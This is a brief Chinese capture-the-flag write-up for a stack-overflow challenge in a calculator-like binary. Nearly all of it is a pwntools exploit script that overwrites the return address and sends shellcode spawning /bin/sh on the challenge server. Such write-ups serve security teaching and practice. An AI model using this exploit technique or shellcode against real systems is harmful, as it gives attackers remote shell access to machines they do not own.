## 分析
一个逆波兰计算器还是啥的，明显的栈溢出，无任何保护。
## 利用
将shellcode写在位置已知的地方，再覆盖返回地址：
```py
#!/usr/bin/env python
# coding=utf-8
from pwn import *
#p = process("./stack_game")
p = remote("202.1.8.12",40002)
def sla(a,b):
    p.sendlineafter(b,a)
    
bufAddr = 0x602080
p.sendline("0")
p.sendline("m")
for i in range(18):
    p.sendline("w")
for i in range(5):
    p.sendline(".")
p.sendline(str(bufAddr+10))
p.sendline("m")
for i in range(2):
    p.sendline("w")

shellcode= "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
shellcode += "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
shellcode += "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

p.sendline("q"*10+shellcode)
p.interactive()
```